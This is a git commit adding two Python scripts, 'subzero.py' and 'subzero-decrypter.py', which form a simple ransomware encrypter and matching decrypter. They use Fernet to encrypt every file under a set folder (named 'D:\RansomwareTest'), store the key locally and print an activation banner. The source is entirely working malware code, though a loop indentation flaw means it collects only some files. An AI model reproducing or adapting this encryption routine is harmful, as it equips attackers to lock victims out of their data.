accbf66b1fbd90a199ab6b472c9588703d994a55
EMRE ASLAN <52652572+aslanemre@users.noreply.github.com>
2023-04-09 15:19:44 +0300

    Add files via upload

---
+++ subzero-decrypter.py
@@ -0,0 +1,49 @@
+#!/usr/bin/env python3
+
+import fnmatch
+import os
+from cryptography.fernet import Fernet
+
+dosyalar = []
+
+for root, dir, files in os.walk("D:\RansomwareTest"):
+        for items in fnmatch.filter(files, "*"):
+                dosya = root + "\\" + items
+
+        if dosya == "subzero.py":
+            continue
+
+        if dosya == "subzero-decrypter.py":
+            continue
+
+        if dosya == "privateKey.key":
+            continue
+
+        if os.path.isfile(dosya):
+            dosyalar.append(dosya)
+
+try:
+    with open("privateKey.key", "rb") as key:
+        privKey = key.read()
+        
+    for dosya in dosyalar:
+
+        with open(dosya, "rb") as dosyaa:
+            icerik = dosyaa.read()
+    
+        sifresiz_icerik = Fernet(privKey).decrypt(icerik)
+
+        with open(dosya, "wb") as dosyaa:
+            dosyaa.write(sifresiz_icerik)
+except:
+    print("[ ! ] Could not read Private Key file.")
+
+try:
+    os.remove("privateKey.key")
+    print("""
+                #########################
+                #   SUBZERO DECRYPTED   #
+                #########################
+    """)
+except:
+    print("[ ! ] Failed to delete Private Key.")
---
+++ subzero.py
@@ -0,0 +1,45 @@
+#!/usr/bin/env python3
+
+import os
+import fnmatch
+from cryptography.fernet import Fernet
+
+key = Fernet.generate_key()
+
+with open("privateKey.key", "wb") as privateKey:
+    privateKey.write(key)
+
+dosyalar = []
+
+for root, dir, files in os.walk("D:\RansomwareTest"):
+        for items in fnmatch.filter(files, "*"):
+                dosya = root + "\\" + items
+
+        if dosya == "subzero.py":
+            continue
+
+        if dosya == "subzero-decrypter.py":
+            continue
+
+        if dosya == "privateKey.key":
+            continue
+
+        if os.path.isfile(dosya):
+            dosyalar.append(dosya)
+
+for dosya in dosyalar:
+
+    with open(dosya, "rb") as dosyaa:
+        icerik = dosyaa.read()
+    
+    sifreli_icerik = Fernet(key).encrypt(icerik)
+
+    with open(dosya, "wb") as dosyaa:
+        dosyaa.write(sifreli_icerik)
+
+print("""
+                #########################
+                #   SUBZERO ACTIVATED   #
+                #########################
+Do not run the encrypter a second time without using the decrypter.
+    """)
